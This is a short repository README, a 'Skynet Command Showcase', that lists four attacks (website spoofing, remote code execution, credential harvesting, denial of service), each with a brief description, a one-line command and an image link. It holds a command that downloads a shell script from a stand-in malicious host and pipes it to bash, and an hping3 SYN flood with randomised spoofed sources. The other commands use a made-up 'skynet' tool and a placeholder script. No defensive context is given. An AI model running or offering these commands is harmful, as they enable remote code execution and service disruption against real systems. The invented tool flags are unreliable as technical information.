# Skynet Command Showcase

This repository demonstrates various skynet commands and attacks. Each command is accompanied by a brief description and an image illustrating the attack.

## Table of Contents

1. [Command 1: Website spoofing](#command-1-website-spoofing)
2. [Command 2: Remote Code Execution](#command-2-remote-code-execution)
3. [Command 3: Credential Harvesting](#command-3-credential-harvesting)
4. [Command 4: Denial of Service](#command-4-denial-of-service)

## Command 1: Website spoofing

### Description
Utilizes a phishing attack to trick users into revealing sensitive information.

### Command
```bash
sudo ./skynet --attack --create-pool --all-queries-to-this-host --create-trojan-web 0
```

### Image
![spoofing](images/website-spoofing.png)

## Command 2: Remote Code Execution

### Description
Executes arbitrary code on a remote system to gain unauthorized access.

### Command
```bash
curl -s https://malicious-website.com/shell.sh | bash
```

### Image
![Remote Code Execution](images/remote_code_execution.png)

## Command 3: Credential Harvesting

### Description
Performs a credential harvesting attack to obtain login credentials.

### Command
```bash
malicious_script.py --target https://target-login-page.com
```

### Image
![Credential Harvesting](images/credential_harvesting.png)

## Command 4: Denial of Service

### Description
Launches a Denial of Service attack to disrupt the target's services.

### Command
```bash
hping3 -S -c 1000 -p 80 --rand-source target-ip
```

### Image
![Denial of Service](images/denial_of_service.png)
